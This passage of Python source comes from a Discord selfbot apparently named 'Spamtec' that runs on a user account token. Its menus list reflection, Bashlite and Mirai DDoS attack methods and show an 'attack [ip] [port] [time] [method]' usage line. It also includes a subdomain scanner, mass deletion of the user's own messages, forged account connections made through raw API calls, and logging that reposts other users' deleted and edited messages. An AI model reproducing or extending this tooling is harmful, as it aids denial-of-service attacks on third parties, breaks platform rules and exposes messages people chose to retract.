                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos reflection")
                await message.delete()
                container = discord.Embed(title="__**Reflection Based Attack Methods**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**Reflection Methods**", value="LDAP\nNTP\nTFTP\nSSDP\nPORTMAP\nCHARGEN\nSENTINEL\nNETBIOS\nMSSQL\nTS3\nDNS\nMDNS\nDB2\nARCEUS\nECHO\nSNMP\nMEMCACHE\nRIP\nREAPER\nHEARTBEAT")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "c2":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos c2")
                await message.delete()
                container = discord.Embed(title="__**C2/Bashlite Based Attack Methods**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**C2 Methods**", value="UDP\nTCP\nLYNX\nVSE\nRAID\nHOME\nSTD\nJUNK\nCOMBO\nSTOMP\nCRUSH\nUNKNOWN\nCNC\nSMITE\nACK\nHEX\nCRASH")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "mirai":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos mirai")
                await message.delete()
                container = discord.Embed(title="__**Mirai Based Attack Methods**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**Mirai Methods**", value="RAWUDP\nACK\nSTOMP\nDNS\nVSE\nSYN\nUDPPLAIN\nSTD\nXMAS\nUDP\nGREETH\nGREIP\nOVHBYPASS\nLYNX\nFRAG\nASYN\nHTTP\nPLAI\nUSYN\nTCP")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)
            else:
                await message.delete()
                container = discord.Embed(title="__**Error!**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="Error!", value="Usage: "+ prefix +"ddostools attack [ip] [port] [time] [method]\nTo list the avaliable methods, type: "+ prefix +"ddos methodlist")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

################################################################################################################################

        if commands[0] == ""+prefix+"menutools":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+ Style.BRIGHT + Fore.WHITE + Back.BLACK + prefix+"menutools")
            await message.delete()
            container = discord.Embed(title="__**Spamtec Menu Tool List**__", color=0xFF0400)
            container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
            container.add_field(name="**Prefix Changer**", value="Usage:"+prefix+"prefix [INPUT]", inline=True)
            container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)
				
################################################################################################################################

        # MASS DELETE OWN MESSAGES
        if commands[0] == ""+prefix+"illegal":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"illegal")
            if len(commands) == 1:
                async for msg in channel.history(limit=9999):
                    if msg.author == client.user:
                        try:
                            await msg.delete()
                        except Exception as x:
                            pass
            elif len(commands) == 2:
                user_id = ''
                for channel in client.private_channels:
                    if commands[1] in str(channel):
                        if str(channel.type) == 'private':
                            user_id = str(channel.id)
                async for msg in channel.history(limit=9999):
                    if msg.author == client.user:
                        try:
                            await msg.delete()
                        except Exception as x:
                            pass

################################################################################################################################


        if commands[0] == ""+prefix+"account":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+ Style.BRIGHT + Fore.WHITE + Back.BLACK + prefix+"account")
            await message.delete()
            container = discord.Embed(title="__**spamtec Menu Tool List**__", color=0xFF0400)
            container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
            container.add_field(name="**Add Any Skype Account To Profile**", value="Usage:"+prefix+"addskype [USERNAME]", inline=False)
            container.add_field(name="**Add Any LeagueOfLegends Account To Profile**", value="Usage:"+prefix+"addleague [USERNAME]", inline=False)
            container.add_field(name="**Playing Status Changer**", value="Usage:"+prefix+"playing [NAME/WORD]", inline=False)
            container.add_field(name="**Watching Status Changer**", value="Usage:"+prefix+"watching [NAME/WORD]", inline=False)
            container.add_field(name="**Streaming Status Changer**", value="Usage:"+prefix+"streaming [QUOTEDWORD] [LINK]", inline=False)
            container.add_field(name="**Reset User Status**", value="Usage:"+prefix+"resetstatus", inline=False)
            container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)

        if commands[0] == ""+prefix+"addskype":
            if len(commands) == 1:
                await message.delete()
            username = commands[1]
            url = "https://discordapp.com/api/v6/users/@me/connections/skype/"+username+""
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                "Authorization": "{0}".format(token),
                "Content-Type": "application/json",
                "Host": "discordapp.com",
                "Content-Length": "44",
            }
            requests.put(url, headers=headers, data='{"name":"'+username+'","friend_sync":false}')
            await channel.send("```Added Skype Connection! ["+ commands[1]+"]```")

        if commands[0] == ""+prefix+"addleague":
            if len(commands) == 1:
                await message.delete()
            username = commands[1]
            url = "https://discordapp.com/api/v6/users/@me/connections/leagueoflegends/"+username+""
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                "Authorization": "{0}".format(token),
                "Content-Type": "application/json",
                "Host": "discordapp.com",
                "Content-Length": "44",
            }
            requests.put(url, headers=headers, data='{"name":"'+username+'","friend_sync":false}')
            await channel.send("```Added League Connection! ["+ commands[1]+"]```")

################################################################################################################################
# logging commands
        # Logging
        if commands[0] == ""+prefix+"logging":
            global logging_enabled
            await message.delete()
            if len(commands) == 2:
                if commands[1] == "on":
                    logging_enabled = True
                    container0 = discord.Embed(title="**Discord Log**", color=0xFF0400)
                    container0.add_field(name=":", value="", inline=True)
                    container0.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                    await channel.send(embed=container0)
                elif commands[1] == "off":
                    logging_enabled = False
                    container1 = discord.Embed(title="", color=0xFF0400)
                    container1.add_field(name="message:", value="", inline=True)
                    container1.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                    await channel.send(embed=container1)
                elif commands[1] == "status":
                    if logging_enabled == True:
                        container2 = discord.Embed(title="", color=0xFF0400)
                        container2.add_field(name=":", value="", inline=True)
                        container2.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                        await channel.send(embed=container2)
                    else:
                        container3 = discord.Embed(title="", color=0xFF0400)
                        container3.add_field(name=":", value="", inline=True)
                        container3.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                        await channel.send(embed=container3)
            else:
                container = discord.Embed(title="", color=0xFF0400)
                container.add_field(name="", value="Consult the help menu.", inline=False)
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)
################################################################################################################################

        # Subdomain scanner v2
        if commands[0] == str(prefix) + "subscan2":
                await message.delete()
                count = 0
                if len(commands) == 2:
                        target = commands[1]
                        containerA = discord.Embed(title="**Subdomain Scanner**", color=0xFF0400)
                        for sub in subdomains:
                                try:
                                        host = str(sub) + "." + str(target)
                                        ip = gethostbyname(str(host))
                                        count = count + 1
                                        containerA.add_field(name=str(count) + ":", value=str(host + ":" + ip))
                                except:
                                        pass
                        containerA.set_footer(text="Created with love by Georgia Cri#4337 & Rajesh#5919", icon_url="https://i.imgur.com/5bd3F42.png")
                        await channel.send(embed=containerA)

        # Automatic Group leaver
        if commands[0] == str(prefix) + "cleangroups":
                await message.delete()
                count = 0
                for channel in client.private_channels:
                        if isinstance(channel, discord.GroupChannel):
                                if channel.id != message.channel.id:
                                        count = count + 1
                                        await channel.leave()

@client.event
async def on_message_delete(message):
    channel = message.channel
    if logging_enabled == True:
        if message.author != client.user:
            container = discord.Embed(title=" | @%s" % message.author, color=0xFF0400)
            container.set_thumbnail(url=message.author.avatar_url)
            container.add_field(name="Message:", value=message.content, inline=False)
            container.add_field(name="Creation:", value=message.created_at, inline=False)
            container.set_footer(text="ID %s" % message.id, icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)

@client.event
async def on_message_edit(before, after):
    channel = before.channel
    if logging_enabled == True:
        if before.author != client.user:
            container = discord.Embed(title=" | @%s" % before.author, color=0xFF0400)
            container.set_thumbnail(url=before.author.avatar_url)
            container.add_field(name="Message:", value=before.content, inline=False)
            container.add_field(name=":", value=after.content, inline=False)
            container.add_field(name="Edit:", value=after.edited_at, inline=False)
            container.set_footer(text="ID: %s" % after.id, icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)
            
client.run(token, bot=False) # Token input 